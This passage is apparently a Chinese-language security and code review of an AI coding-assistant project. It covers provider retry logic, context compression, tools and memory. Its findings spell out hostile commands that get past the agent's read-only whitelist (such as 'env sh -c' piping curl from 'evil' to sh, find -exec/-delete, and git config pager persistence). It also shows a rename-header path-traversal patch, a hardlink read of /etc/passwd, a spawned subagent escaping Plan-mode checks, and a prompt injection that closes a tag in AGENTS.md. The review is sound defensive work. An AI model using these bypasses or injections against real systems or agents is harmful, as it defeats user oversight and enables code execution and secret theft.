**文档漂移的根因判断**：不是作者不认真（项目对自己缺陷的记录习惯其实很好，多处都标注了 ARCH-x 豁免与历史根因），而是 **`AGENTS.md` §4.1「改代码必改文档」这条规则没有机器强制手段**。依赖方向有 `manifest_guard` 强制、DTO 有 `gen-types` + `git diff --exit-code` 门禁、lint 有 workspace 级收敛——**唯独文档没有对应的守卫**。

**建议**：把"文档中的文件路径引用"做成可测试项。例如加一个 `xtask`（或 `tests/doc_guard.rs`），扫描 `docs/*.md` 中的 `crates/...rs` 路径引用并断言其存在。以这个项目的工程纪律，这是完全可行且高性价比的。

---

## 4. AI Provider 系统（`minicoding-providers`，6,418 行 / 12 文件）

### 4.1 Provider 实现清单

| Provider | 状态 | 说明 |
|----------|------|------|
| OpenAI 兼容 | 完整 | 含前缀启发式推断 context_window、env 覆盖口 |
| Anthropic | 完整 | 含 thinking/reasoning 预算处理 |
| Ollama | 完整 | `num_ctx` 感知窗口（R9 PROV-2 修复） |
| 其他（Gemini/Bedrock/Azure…） | **无** | README 未宣称，不构成缺陷 |

三者共享 `LlmProvider` trait，覆盖 streaming / tool-calling / token counting / capabilities 报告。

### 4.2 值得肯定的部分

1. **重试语义正确且幂等安全**（`common/retry.rs:146-190`）：只对**请求建立阶段**重试（`chat_stream` resolve 为 `Err` 时），流建立后返回 `Ok(stream)` 的中途错误**绝不重试**——注释（retry.rs:3-6）明确"重试会重复已产出内容"。指数退避 + splitmix64 抖动 80~120%（retry.rs:39-47，已修掉 thundering herd）。LLM 调用本身无副作用，重试天然幂等。接线点：`sdk/builder.rs:190-197`、`server/runtime_builder.rs:169`。
2. **SSE/NDJSON 解析器质量高**（`common/sse.rs`）：缓冲 `Vec<u8>` 而非 String（避免 chunk 边界切断 UTF-8，有测试 `utf8_multibyte_cross_chunk_boundary`）、三种行尾 `\n\n`/`\r\r`/`\r\n\r\n` 取最早边界、16 MiB 缓冲上限 **fail-closed**（有回归测试）。20+ 个单测。
3. **错误分类结构化**：`LlmError::ContextLength`/`AuthInvalid`/`Filtered`（`core/model/error.rs:76-84`），`is_retryable()` 明确排除 4xx/超窗/鉴权（error.rs:110-117），Runtime 侧有紧急压缩联动（`rt.rs:651-671`）。

### 4.3 缺陷

**【R10-21 / P2】`context_window` 无单一事实来源**【主审核实】

三个 provider 各自声明，口径不一：

| Provider | context_window 来源 | env 覆盖口 |
|----------|-------------------|-----------|
| `openai.rs:547` | 模型名前缀启发式 + `MINICODING_CONTEXT_WINDOW` | ✅ 有（R9 PROV-3 修复） |
| `anthropic.rs:252` | **恒为 `200_000`，与 model 无关** | ❌ **无** |
| `ollama.rs:227` | `8192` / `num_ctx` 感知 | ❌ 无 |

后果：经代理/网关接入小窗口模型时，Anthropic 侧会**永远认为有 200K 可用**，压缩永不触发，只能等真实 400 错误兜底。这与 §6 的预算问题叠加后后果放大。

**建议**：把 `context_window` 的解析收敛到一处（如 `core::provider::capabilities` 提供 `resolve_context_window(caps, env_override)`），三个 provider 都调用它；env 覆盖口对所有 provider 生效；并在启动时 warn 打印"生效的 context_window 来源（推断/env/硬编码）"。

**【P2】`Retry-After` 无上限，服务端可令进程睡眠任意时长**（`common/retry.rs:174-176`）

```rust
e.retry_after_ms().map_or_else(|| self.backoff(attempt), Duration::from_millis)
```

对 `Retry-After: 86400` 直接 `sleep(24h)`。仅由 turn 级超时（默认 600s，`config.rs:137`）兜底，但该期间整个 turn 挂死。另：`retry_after_ms`（`openai.rs:417`/`anthropic.rs:434`）只解析整数秒，**HTTP-date 形式静默返回 `None`**。

**建议**：钳位到 `[0, 60s]`，并支持 HTTP-date 解析。

**【P2】并行工具调用的 `index` 聚合缺陷**（`core/runtime/accumulator.rs:53-64`）

`BTreeMap<u32, ToolCallAcc>` 以 `index` 为 key，`openai.rs:470` 的 `u32_from_json(tc.get("index")).unwrap_or(0)` 对**缺失 `index`** 一律返回 0。部分 OpenAI 兼容网关（DeepSeek/vLLM/自建代理）不发送 `index` → N 个并行工具调用全部落到 key 0 → id/name 被最后一条覆盖、args 首尾拼接 → 产出畸形工具调用（解析失败 → `Value::Null` → dispatch `InvalidInput`）。

同理 `ollama.rs:411` 用 `tool_calls.iter().enumerate()` 按**单行**编号，跨 NDJSON 行的两个单元素 `tool_calls` 也会撞 index 0。

**建议**：缺失 `index` 时回退到"按出现顺序追加"而非默认 0；Ollama 侧用跨行全局计数器。

**【P3】`supports_json_mode` 是死标志**：全仓无任何 `response_format` 写入，只有能力声明（`openai.rs:236`、`ollama.rs:221`）+ 测试断言；`GenerationParams`（`core/provider/trait.rs:37-56`）也没有该字段。两个 provider 声明 `true` 却从不请求 JSON 模式。

**【P3】无熔断 / 无 provider failover**：`core/provider/router.rs` 只有 `StaticRouter`（恒返回同一 provider），三家 provider 无互相降级。对于"AI 编码助手"这种长时运行场景，单 provider 持续故障时体验会很差。

**【P2】配置明文 API key 被接受，与 C-04 声明矛盾**（`core/config.rs:325-339`）：`resolve_env_syntax` 对非 `env:` 前缀值 `Some(s.to_string())` 原样返回。而 `providers/src/lib.rs:9-10` 明确宣称"绝不接受配置文件明文（C-04）"。测试 `config.rs:482` 里就躺着 `api_key = "sk-literal-secret-123"`。

LKG 快照确实做了剥离（`scrubbed_for_lkg`，`config.rs:409-421`），但主 `config.toml` 明文可用，**且落盘时无 0600 保证**（与 `cli/cred.rs` 的 0600 + 原子 rename 形成对比）。两处口径不一致，应统一为"拒绝明文 + 报错提示改用 `env:`"。

### 4.4 Token 计数精度

`ApproxTokenizer`（`anthropic.rs:625-670`）：CJK 1 token/字、非 BMP 4 token/个、其余 `div_ceil(4)`。

**风险**：对代码/JSON（大量 `{}"` 符号），Claude 实际分词常达 3–4 字符/token，方向偏乐观。项目已用 `calibrate`（`manager.rs:589-593`，α=0.5 指数平滑）用真实 API 返回值校正，方向安全但**收敛偏慢**（单次大偏差需数轮反映）。

`tiktoken-rs` 对 OpenAI 侧提供较准计数；Anthropic 侧无官方 tokenizer，近似是合理选择。

---

## 5. 工具系统（`minicoding-tools`，12,199 行 / 37 文件）

### 5.1 工具清单与 `SideEffect` 声明（20 个工具）

`SideEffect` 是权限链与调度分桶的**唯一依据**，因此这一列的准确性直接决定安全性。

| 工具 | side_effect | 路径边界 | 备注 |
|------|-------------|---------|------|
| `fs.read` | None | `resolve_path`（read.rs:90） | 大小预检 + 敏感文件脱敏 ✓ |
| `fs.list`/`fs.glob` | None | `resolve_path` | `follow_links(false)` ✓ |
| **`fs.grep`** | None | `resolve_path` | ⚠️ **无脱敏、无大小上限**（R10-12） |
| `fs.write` | FileWrite | `resolve_path` + `assert_within_workdir` | `atomic_write` + journal ✓ |
| `fs.edit`/`fs.multiedit` | FileWrite | `resolve_path` | ✓ |
| `fs.delete` | FileWrite | `resolve_path` | ✓ |
| `shell.run` | Command | `current_dir(workdir)` | `sh -c`，无命令过滤，env 白名单 ✓ |
| `shell.background`/`shell.kill` | Command | 同上 | 无超时（设计如此），LRU + killpg ✓ |
| `shell.output` | None | — | 有脱敏 ✓ |
| **`git.diff`** | None | `resolve_path` | ⚠️ **无脱敏** |
| `git.apply` | FileWrite | `validate_patch_paths` | ⚠️ rename 头未校验（见下） |
| `web.fetch`/`web.search` | Network | — | SSRF + pinning ✓ 优秀 |
| `task.create/update/list` | None | — | 内存状态 |
| **`task.spawn`** | **None** | — | ❌ **P0，见 R10-02** |
| **`plan.exit`** | **None** | — | ⚠️ 修改全局状态却免检（见下） |
| `ui.ask` | None | — | ⚠️ 只读桶直发，不可限流 |
| `memory.write` | FileWrite | 写 home 下（非 workdir） | 按 target 细分权限 ✓ |

### 5.2 【R10-02 / P0】`task.spawn` 绕过权限链与 Plan 模式 —— 主审独立复核

这是本次审查**最严重**的发现。完整证据链如下（全部经我本人读取源码确认）：

**第 1 环：`task.spawn` 声明 `SideEffect::None`**

`crates/minicoding-tools/src/task/spawn.rs:208-210` 返回 `SideEffect::None`。**并且有一个测试在断言这个行为**（`spawn.rs:578-582` `task_spawn_is_read_only_and_no_side_effect`）——说明这是有意为之，不是笔误。

**第 2 环：只读桶不做权限检查**

`crates/minicoding-core/src/runtime/rt.rs:1254-1258`：
```rust
let readonly_of = |c: &ToolCall| {
    self.tools
        .get(&c.name)
        .is_some_and(|t| t.side_effect() == SideEffect::None)
};
```

落入只读桶的调用走 `run_readonly_bucket`（rt.rs:1336+），其核心是 `rt.rs:1393`：
```rust
let result = match tools.dispatch(&call, &ctx).await {
```

而 `ToolRegistry::dispatch`（`core/tool/registry.rs:111-127`）**只做查表 + 超时**，完全不含 `policy.check`：
```rust
pub async fn dispatch(&self, call: &ToolCall, ctx: &ToolContext) -> Result<ToolResult, ToolError> {
    let tool = self.tools.get(&call.name).ok_or_else(...)?;
    if ctx.timeout.is_zero() {
        return tool.execute(call.input.clone(), ctx).await;
    }
    match tokio::time::timeout(ctx.timeout, tool.execute(call.input.clone(), ctx)).await { ... }
}
```

【主审核实】全仓 `policy.check` 的生产调用点**只存在于副作用路径**（`execute_side_effect_call`）。因此只读桶内的工具：

- ❌ 不调用 `policy.check`（不过权限策略、不过 blacklist 的 Plan 门）
- ❌ 不触发 PreToolUse Hook
- ❌ 不落权限审计（R9 P2-3 只补了**成功调用**的审计记录，rt.rs:1427）
- ❌ 不受 Plan 模式硬门约束

**第 3 环：子 Agent 不继承 Plan 模式**

`crates/minicoding-sdk/src/subagent.rs:217-234` 构造子 Runtime：
```rust
let mut builder = RuntimeBuilder::new()
    .tools(build_child_registry())
    .policy(policy)        // ← 继承父策略（好）
    .prompter(prompter)    // ← 继承父 prompter（好）
    ...
```
【主审核实】`subagent.rs` 全文 **从未调用 `.permission_mode()`**，且 `grep -n permission_mode crates/minicoding-sdk/src/subagent.rs` **零命中**。而 `RuntimeBuilder` 的默认值是 `PermissionMode::Default`（`core/runtime/builder.rs:134`）。

Plan 模式硬门的唯一实现在 `policy/builtin.rs:83`：
```rust
if ctx.permission_mode == PermissionMode::Plan && ctx.side_effect != SideEffect::None {
```
它读取的是 `ctx.permission_mode`——子 Runtime 该值为 `Default` → **硬门永不触发**。

而子工具集 `build_child_registry()`（subagent.rs:168-177）包含：
```rust
minicoding_tools::register_write_tools(&mut tools);   // fs.write/edit/delete
minicoding_tools::register_shell_tools(&mut tools);   // shell.run/background
```

**完整攻击路径**：
```
用户以 Plan 模式运行（期望"只读、绝不写"）
   ↓
模型调用 task.spawn{type:"general", prompt:"..."}   ← 免检（SideEffect::None）
   ↓
子 Runtime 以 PermissionMode::Default 启动
   ↓
子 Agent 调用 fs.write / shell.run
   ↓
走副作用路径 → 继承的 policy（Default 模式）
   ↓
若用户此前对同类操作点过"始终允许"（policy.toml），或运行于 auto 模式
   ↓
写文件 / 执行命令 —— Plan 模式的只读保证被击穿
```

**严重性说明（避免过度夸大）**：由于子 Agent 仍继承父 `policy`/`prompter`，其写操作**仍会经过权限查询**。因此这不是"完全无审批的任意写"，而是：

- **Plan 模式从"硬保证"降级为"普通 Default 模式的软提示"**——这违背了 Plan 模式的产品契约（README 宣称"双重只读强制"）；
- 若用户有持久化批准、或处于 `auto`/`AcceptEdits` 模式，则**实际可写、可执行**；
- 另外 `spawn.rs:236` 的守卫只把 `SubagentType::Plan` 降级为 explore，对 `general` 类型**无任何约束**。

**修复建议（三选一，推荐 1+3）**：
1. **给 `SideEffect` 增加第四档 `SideEffect::Spawn`（或 `Control`）**，语义为"不产生直接副作用，但会派生具有副作用能力的子执行体"。只读桶只接受 `None`，`Spawn` 走完整的权限 + Hook 链。
2. 在 `subagent.rs` 中显式传播 `.permission_mode(parent_mode)`，并**禁止**子级拥有比父级更宽松的模式（取更严者）。
3. 在 `task.spawn` 内部**主动**校验父 `permission_mode`：Plan 模式下只允许 `SubagentType::Explore` / `Plan`，拒绝 `general` / `custom`。

### 5.3 【R10-01 / P0】只读命令白名单可绕过 —— 主审独立复核

`policy/src/builtin.rs:145-190` 的 `is_harmless_command` 在 Default 模式下对"无害命令"直接返回 `Verdict::Allow`（**零弹窗**）。

【主审核实】完整逻辑：
```rust
const READONLY_VERBS: &[&str] = &[
    "ls", "cat", "head", "tail", "grep", "find", "pwd", "echo", "date", "which", "wc", "uname",
    "whoami", "printf", "true", "false", "env", "dir", "type", "help",
];
...
// 复合操作符/重定向/管道/子 shell/后台 → 不自动放行
if [";", "&&", "||", "|", ">", "<", "`", "$(", "&", "\n", "\r"]
    .iter().any(|op| command_text.contains(op)) { return false; }
let tokens = tokenize_command(&command_text);
let verb = tokens.first().map(String::as_str).unwrap_or_default();
if READONLY_VERBS.contains(&verb) { return true; }
```

**绕过方式（我逐条验证）**：

| Payload | 为何绕过 | 后果 |
|---------|---------|------|
| `env python3 /tmp/payload.py` | 首 token `env` 在白名单；整条无分隔符 | **任意命令执行，免确认** |
| `env sh -c 'curl evil\|sh'` | 同上 | 任意远程代码执行 |
| `find . -exec sh -c 'x' +` | 首 token `find`；`-exec ... +` 形式**不需要 `;`** | 任意命令执行 |
| `find . -delete` | 无操作符 | **静默删除文件** |
| `find . -fprintf /tmp/out '%s'` | 无 `>` 操作符 | 向 workdir 外写文件 |
| `git config core.pager 'sh -c ...'` | `config` 在 git 白名单（builtin.rs:172），**未限制 `--get`** | 写入 `.git/config`，后续 git 操作执行该命令 → **持久化执行原语** |
| `git config --global core.sshCommand ...` | 同上，且作用于全局 | 跨仓库持久化 |
| `git remote set-url origin ...` | `remote` 在白名单，未限制子动词 | 篡改仓库配置 |
| `cargo check` | `cargo check/fmt/clippy` 在白名单（builtin.rs:178-180） | **`build.rs` 与 proc-macro 在编译期执行任意代码** |

**关键点**：函数的文档注释明确写着"解释器（`python -c '...'`）明确不在白名单，仍走 Ask"，以及"`git` 只读子命令（status/diff/log/show/branch/remote/**config --get**）"。**作者的意图是对的，但实现没有兑现这个意图**——`env` 作为解释器前缀、`git config` 的写形式、`find` 的 `-exec +` 形式，都是白名单按"首 token"匹配的固有盲区。

另需说明：`cargo check` 会执行 `build.rs`，这是 Rust 生态众所周知的事实，把"编译检查"归类为"无副作用"是**分类错误**。

**严重性**：Default 模式下，上述命令**完全不弹窗、不询问、直接执行**（仍受沙箱约束——但见 R10-03，沙箱在 Linux 上可能 fail-open，在 Windows 上不存在）。对于一个以"安全可控"为核心卖点的产品，这是**安全边界的实质性击穿**。

**修复建议**：
1. `env` 必须从白名单移除（它的语义就是"执行命令"，与"只读"完全相反）。
2. `find` 移除，或严格禁止 `-exec`/`-delete`/`-fprintf`/`-fls`/`-ok` 等所有副作用 primaries。
3. git 白名单必须校验**完整子命令**：`config` 仅当含 `--get`/`--list` 时放行；`remote` 仅当子动词为 `get-url`/`-v`/`show` 时放行。
4. `cargo check/fmt/clippy` 移出自动放行（或至少在存在 `build.rs`/proc-macro 时不放行）。
5. 更根本的：**白名单应基于"已解析的参数树"而非"首 token + 字符串包含"**。当前 `tokenize_command` 后只看 `tokens[0]` 与 `tokens[1]`，无法表达"`git config` 的写形式禁止"这类规则。

### 5.4 【R10-12 / P1】脱敏覆盖不一致

全仓 `redact` 调用点**仅 3 处**：`fs/read.rs:127`（且仅当 `is_sensitive_path` 命中）、`shell/run.rs:238`、`shell/output.rs:87-88`。

因此存在**可演示的绕过**：
```
fs.read  ~/.aws/credentials   → 被脱敏 ✓
fs.grep  pattern=".*" path=".env"  → 完整输出所有密钥 ✗
```
（`tools/fs/grep.rs:161` 直接 `read_to_string` 后整行输出，无脱敏、无大小上限。）

同样不脱敏的：`git.diff`（diff 正文）、`git show`、`task.spawn` 返回的子 Agent summary。

**建议**：把脱敏下沉到**统一的输出包装层**（而非在各工具里逐个调用）。所有进入模型上下文的工具输出都应经过同一个 `sanitize()`，并保留一处"允许原始输出"的白名单（如 `shell.output` 已脱敏）。

### 5.5 其他工具缺陷

**【P2】`fs.grep` 无单文件大小上限**（`grep.rs:161`）：`fs.read` 已用 `metadata().len() > max_read_bytes` 前置拦截（`read.rs:95-105`），`fs.grep` 没有。仓库内一个 4 GB 日志/二进制文件即可打爆内存——且 `spawn_blocking` 线程不受 async 取消约束，**超时也杀不掉**。

**【P2】`git.apply` 的 patch 路径校验忽略 rename/copy 扩展头**（`git/apply.rs:22-78`）：`validate_patch_paths` 只检查 `--- `/`+++ `/`diff --git ` 三行。但 git 的 `parse_git_header` 以 `rename from`/`rename to`（及 `copy from`/`copy to`）为**权威**目标名，会覆盖 `diff --git` 行给出的名字。构造：

```
diff --git a/x b/x
rename to ../../evil
```

即可让 `--- `/`+++ ` 与 `diff --git` 全部通过校验，而 git 实际写入越界路径。工具是 `SideEffect::FileWrite`（需批准），但批准界面展示的是 patch 原文中**看起来安全**的头部——**用户看到的内容与实际写入的目标不一致**，这本身就是一个 UX 安全问题。

**【P2】硬链接绕过**（`policy/path_sandbox.rs:52`）：`resolve_under` 依赖 `canonicalize`，无法区分硬链接。攻击者在 workdir 内 `ln /etc/passwd ./notes.txt` 后，`fs.read` 会合法读出 `/etc/passwd`（路径判定完全通过）。缺 `nlink > 1` 检查。同文件系统约束使利用门槛较高，但确实是 C-03 的洞。

**【P2】TOCTOU / Windows 无兜底**（`path_sandbox.rs:37-43` 已如实披露）：`resolve_under` 是 check-then-use，Linux/macOS 靠 landlock/Seatbelt **二次强制**，**Windows 上 Job Object 不做 FS 隔离，此窗口是唯一防线**。`fs/read.rs:95`（`metadata`）→ `:107`（`read_to_string`）是典型 check-then-open。

**【P3】shell 无命令过滤是设计选择**：`shell/run.rs:112-119` 直接 `sh -c` / `cmd /C`，`;`/`&&`/`|`/反引号/变量展开全部可用。唯一的门是 `SideEffect::Command` → `policy.check` → prompter。**这本身不是 bug**（Claude Code / Codex 亦然），但意味着 prompt injection 一旦让模型发起 `shell.run`，防线只剩用户确认。非 TTY 时 `NonInteractivePrompter` 恒 Deny（CI 安全 ✓）。

### 5.6 值得肯定的部分

1. **原子写 + TOCTOU 收口**（`tools/src/util.rs:83-116`）：`create_new(true)`（R9 FS-1 明确修掉了 `create(true).truncate(true)` 跟随预置 symlink 写穿的问题）+ pid/计数后缀避免并发冲突 + `fsync` + `rename`，并保留原权限位。
2. **工具输出边界注入防护**（`providers/common/mod.rs:63-72`）：`wrap_tool_output` 用零宽空格打断字面 `</tool_output>`，防恶意内容提前闭合边界（S21，有单测）。—— **讽刺的是，这个防护没有应用到 AGENTS.md 注入（见 R10-07）**。
3. **进程清理**（`shell/run.rs:127-134`）：`pre_exec(setpgid(0,0))` 自成组长，超时 `killpg` 杀整树；R8 TL-1 补了 `PIPE_DRAIN_GRACE`（run.rs:334）+ 强杀兜底，修掉了 `setsid sleep &` 持管道致永久挂起的问题。后台 shell 同样有 pgid 清理。
4. **shell env 白名单**：`SAFE_ENV_WHITELIST` 单一事实源 + `env_clear()`（run.rs:120、145-149），凭证变量绝不下传子进程。`redact_secrets`（run.rs:376-420）做**值边界**精确替换而非整行吞，保留了上下文可读性。
5. **只读桶审计补口**：R4/SEC-11 把 sandbox denial 检测与审计下沉到只读路径，且 `readonly_of` 对未注册工具返回 false（**fail-closed**，rt.rs:1249 注释）——这个设计是对的。
6. **SSRF 防护扎实**（`web/ssrf.rs` + `web/fetch.rs:148-186`）：覆盖 IPv4-mapped IPv6 / NAT64 / 6to4 / CGNAT / `0.0.0.0/8` / benchmark 段；逐跳重定向重校验 + `Client::resolve()` IP pinning（禁自动重定向、上限 5 跳、URL 长度限 2048），消除了 DNS rebinding 窗口。**这块比多数同类项目做得好。**
7. **MCP 远端自我声明默认不信任**（`mcp/src/client/wrapper.rs:52-55`）：`readOnlyHint` 是 MCP server 的自我声明，项目默认 `trust_read_only_hint = false`，未获显式信任的 server 即使声明只读，仍被映射为 `SideEffect::Command` 走完整权限链，**不会**因谎报只读而绕过权限。考虑到 §5.2 揭示的「只读桶免检」风险，这个默认值的正确性尤为关键——**「远端声明不可信」这一判断是本项目安全设计中最清醒的一处。**

---

## 6. 上下文管理与压缩（`minicoding-context`，6,261 行 / 19 文件）

### 6.1 "4 级压缩"的文档宣称 —— 核验结果：准确 ✅

README 与 `innovation.md` §5.1 宣称"4 级压缩管道：裁剪 → 摘要 → 滚动 → 硬截断"。

【子审查核实】`compress/mod.rs:84-148` 中 4 级的命名与触发顺序**与文档完全一致**。这在文档漂移普遍存在的项目里是难得的准确。

| 级别 | 名称 | 触发 | 产出方式 |
|------|------|------|---------|
| L1 | 裁剪（Trim） | 超预算 | 确定性，删除低权重消息 |
| L2 | 摘要（Summarise） | L1 不足 | **LLM 调用**降级链 |
| L3 | 滚动（Rolling） | L2 失败/仍超 | 按组边界丢弃最老的 N 组 |
| L4 | 硬截断（Hard truncate） | 兜底 | 保留尾部，其余全丢 |

`weight.rs:33` 的权重 `w = base × (i+1)/N` 与 sticky×1.5 已真正生效（CTX-R6-5）；pinned 消息在 L2/L3/L4 **一致豁免**（`summarize.rs:79`、`rolling.rs:41`、`hard_truncate.rs:51`）。

### 6.2 值得肯定的部分

1. **工具调用配对完整性是全仓最扎实的模块**。`compress/tool_group.rs` 把"assistant(含 tool_calls) + 紧随的连续 `Role::Tool`"建模为**原子组**，`expand_to_groups`（L2/L3）与 `extend_prefix_to_group_boundary`（L4）保证删除不跨组边界；`repair.rs:265-290` 作为发送前最后防线，剔除无 call_id 的孤儿 tool_result、为悬空 tool_call 回填 `is_error` 合成结果；**幂等且只作用于请求副本**。这是压缩功能最易出错之处，本项目处理完善。
2. **熔断状态机**（`circuit_breaker.rs`）：fail=3 / force_end=5 / thrash=2 / 60s 半开冷却，`build_chat_request` 前置拒绝（`manager.rs:738-751`）；`manager.rs:446` 对"固定开销就超出窗口"的小窗口模型**跳过 oversize 分支**，避免永久锁死。
3. **L2 超时兜底**（CT-1，`fallback.rs:93-109`）与启发式摘要的截断标注 `…(截断, 原文 N 字符)`（`fallback.rs:165-170`）——让模型知道这是低质量近似而非语义浓缩。这个细节很有品味。
4. **`calibrate` 用真实返回值校正估算**（`manager.rs:589-593`），方向正确。

### 6.3 缺陷

**【R10-10 / P1】输出预留硬编码 4096，与 provider 声明的 64K 脱钩**【主审核实】

```rust
// context/budget.rs:26-34
pub fn new(context_window: usize) -> Self {
    Self {
        context_window,
        reserved_output: 4096,     // ← 硬编码，全仓无第二处赋值
        safety_margin: 1024,
        ratio: 0.85,
    }
}
```

而 `anthropic.rs:258` 声明 `max_output: THINKING_MAX_OUTPUT_LIMIT`（= 64,000，见 `anthropic.rs:572`），且 `manager.rs:822` 发送时 `max_output_tokens: None`（不设上限）。
`compute_max_tokens`（`anthropic.rs:582-600`）在 `None` 时会取到 64K。

**算术后果**：
```
可用预算 = 200,000 − 4,096 − 1,024 = 194,880
压缩阈值 = 194,880 × 0.85        = 165,648
若模型真实输出 64K：165,648 + 64,000 = 229,648 > 200,000  → 真实 400
```

而压缩的触发判据只看输入侧 token 数，**永不考虑真实输出长度** → 压缩不会触发，直接撞 400。

**建议**：`reserved_output` 应由 `provider.capabilities().max_output` 驱动（取 min(声明值, 窗口的 25%)），并可通过 config 覆盖；同时在紧凑预算下**主动压低** `max_output_tokens` 而不是放任不管。

**【R10-21 / P2】`context_window` 无单一事实来源**（已在 §4.3 详述，此处强调与压缩的耦合后果）

Anthropic 侧**恒 200K 且无 env 覆盖口** → 经网关接入 32K 窗口模型时，压缩**永不触发**（系统认为离 165K 阈值还很远），只能等真实 400 后被 `LlmError::ContextLength` 兜底（`rt.rs:651`）。这是"估算失准 → 压缩失效 → 硬失败"的连锁。

**【P1】触发阈值与成功判据口径不一致 → 健康会话可被误熔断**（`manager.rs`）

- 触发：`manager.rs:678` `let threshold = self.budget.compact_threshold();`（**基础阈值**）
- 成功判据：`manager.rs:428` `self.effective_compact_threshold()`（低估 streak ≥ 3 后**收紧至 −40%**）
- 预测分支 `manager.rs:706` 同样用基础阈值

低估检测生效后，压缩在**基础阈值**触发、却按**收紧阈值**判成功 → 落入两阈值之间的区间即 `record_oversize` → 连续 2 次（`thrash_threshold = 2`）→ `BudgetExceeded`。而 `handle_oversize` 在未熔断时**仍照发请求**（`manager.rs:501-530`）。

**即：一个实际上很健康的会话，可能因为阈值口径错位而被判定为 thrash 并熔断。** 这是最需要优先修的逻辑错误之一。

**建议**：触发与判据必须使用同一个函数（推荐统一用 `effective_compact_threshold()`），或显式记录"触发时用的阈值"并在判成功时复用。

**【P1】L2 摘要把首条消息变成 `assistant` → Anthropic 400**（`summarize.rs:119,148-169`）

摘要消息固定为 `Role::Assistant`，插入在 `to_summarize[0]`。而权重公式 `w = base × (i+1)/N`（weight.rs:33）使 index 0 的消息权重极低（N=20 时 user 消息得 0.045，最新 tool 消息得 0.4）→ **index 0 几乎必然落在被摘要的最低权重半数里**。

`message_to_anthropic`（anthropic.rs:324-327）把 `Assistant` 映射为 `"assistant"`，而 Anthropic API **要求首条消息为 `user`**。全仓无首消息角色归一化（`grep messages[0] / ensure_first` 零命中），`repair_request_messages`（repair.rs:265）也不修角色序。

**建议**：`repair.rs` 增加"首消息角色归一化"（assistant → 合并到 system 或插入占位 user 消息）。这与团队已在 `repair.rs` 做的 tool 配对修复是同一类防御，应一并处理。

**【P2】文档声称的三级降级链，压缩路径只有两级**（`summarize.rs:111`）

```rust
summarize_with_fallback(&selected, provider, None, config)   // secondary 恒为 None
```
`fallback.rs:63-78` 的"备用 provider"分支在压缩路径是**死代码**（仅 `session_sum` 可能传 `Some`）。

**【P2】摘要请求自身无预算 → 半会话塞进单条 user 消息**（`fallback.rs:48-52`）

把全部选中消息的 `full_text()` 渲成**一条** user 消息；选中数 = 非 system 消息的 50%。会话 100K 时该请求约 50K+，自身超窗 → 400 → 直接退到启发式兜底（每消息首 200 字符 `; ` 拼接）。且 `max_output_tokens = 200`（`summarize.rs:27`）对半会话摘要极紧。**无分块、无输入预算。**

**【P2】压缩后"已修改文件"完全丢失**（`post_compact.rs:60`）

只提取 `tool_call.name == "fs.read"`。`fs.write`/`fs.edit` 的目标**从不记录**，也无"已改动文件清单"注入。L3/L4 之后模型**失去改动轨迹**——这对编码助手是实质性功能损失（模型可能重复修改、或声称改了其实没改）。

`extract_read_files` 在压缩**前**提取（`manager.rs:727`，CT-5 修复）这点是对的，但只覆盖 read。

**建议**：`post_compact` 应同时提取 `fs.write`/`fs.edit`/`fs.multiedit`/`fs.delete` 的目标路径，注入形如 `<modified_files>` 的段落。

**【P2】紧急压缩重试绕过了配对修复**（`rt.rs`）

`rt.rs:651` 在 `loop` **之外**调用 `repair_request_messages`；`rt.rs:687` 紧急压缩后 `req = new_req` 直接回到 `stream_llm(req)`，`new_req.messages` **未经 repair**。即紧急压缩这条兜底路径恰好绕开了配对修复——而紧急压缩正是**最可能破坏配对**的操作。

**【P3】`StateKeep` 断言是空转**（`manager.rs:359`）：快照的是静态 `system_prompt` 字段，而生产走 `PromptPipeline`（`manager.rs:274-287`），断言不覆盖真正生效的 system。且是 `debug_assert`（release 下不生效）。

**【P3】历史里的 system 消息是纯浪费**：`repair.rs:266-269` 发送前剔除全部 `Role::System`，但 L3/L4 拼命保留它们且**照常计费**。应在压缩阶段就剔除/合并历史 system 消息。

**【P3】fast path 锁竞争**（`manager.rs:379-396`）：写锁跨整个管道（含 L2 的 LLM 调用），30s 超时封顶；期间所有 `append` 阻塞（代码注释已承认，manager.rs:373-377）。长会话中可能造成可感知的卡顿。

**【P3】`calibrate` 收敛慢**：`usize::midpoint`（α=0.5 指数平滑），单次大偏差需数轮才反映。

---

## 7. 记忆机制（`minicoding-memory`，4,642 行 / 13 文件）

### 7.1 记忆类型

| 类型 | 位置 | 说明 |
|------|------|------|
| 长期记忆（LongTerm） | `~/.minicoding/memory/long_term.md` + `index.json` | 双文件 + mtime 缓存 |
| AutoMemory | `~/.minicoding/memory/auto*.{md,json}` | LLM 自动提取 + 来源文件指纹 stale 治理 |
| 项目记忆（AGENTS.md） | 仓库内分层加载 | 兼容 `CLAUDE.md`/`.cursorrules` fallback |
| 会话记忆 | JSONL 转录 | Event Sourcing |

### 7.2 值得肯定的部分

1. **AutoMemory 陈旧治理**（CTX-4，R9 修复）：90 天超时标注 + **来源文件 mtime 晚于条目更新时间即标注"来源已变更"**（`auto.rs:363-366,393-401`），容量淘汰按 `confidence asc, updated asc` 且不打乱插入序。这个设计考虑了"记忆会过时"这个真实问题，比多数实现周到。
2. **`@import` 与 post_compact 的符号链接防护**（`post_compact.rs:106-145`、`loader.rs:86-146`）：canonicalize 消解 symlink 后**二次**组件级前缀比较，两侧对称规范化（跨 Windows 前缀已修），深度/环/数量（MAX_IMPORTS=64）三重限流，**fail-closed**。
3. **AGENTS.md 注入附带修改时间**（CTX-5，`loader.rs:337-347`），让模型知道指令的新鲜度。

### 7.3 缺陷

**【R10-07 / P1】记忆注入零净化 → 克隆不可信仓库即持久注入**

`memory/project_doc/inject.rs:61` 与 `contributors/project_rules.rs` 直接：
```rust
format!("<{tag}>\n{memory}\n</{tag}>")
```

AGENTS.md 或 `@import` 内容里放一个字面 `</project_doc>` 即可**闭合边界**，其后内容变成裸 system 指令，注入到**每一轮**的 system prompt。

**这构成本项目最现实的攻击面**：用户 `git clone` 一个恶意仓库 → 打开会话 → AGENTS.md 被自动加载 → 持久注入。（AGENTS.md 是否首次确认？见下 B 类。）

**特别值得指出的一致性反差**：项目在 `providers/common/mod.rs:52-57` 的 `wrap_tool_output` 中**已经实现**了 S21 零宽空格转义来防止 `</tool_output>` 边界闭合，且有单测。**同样的防护没有应用到记忆注入路径。**

**建议**：把 `wrap_tool_output` 的转义逻辑抽成公共函数 `escape_boundary_tag(s: &str) -> String`，在**所有**"把不可信内容塞进定界块"的位置统一调用（记忆注入、AGENTS.md、MCP 输出、web.fetch 结果、Hook 注入内容）。

**【R10-08 / P1】记忆无读取/列举/删除入口，且 `auto` 默认 Allow**

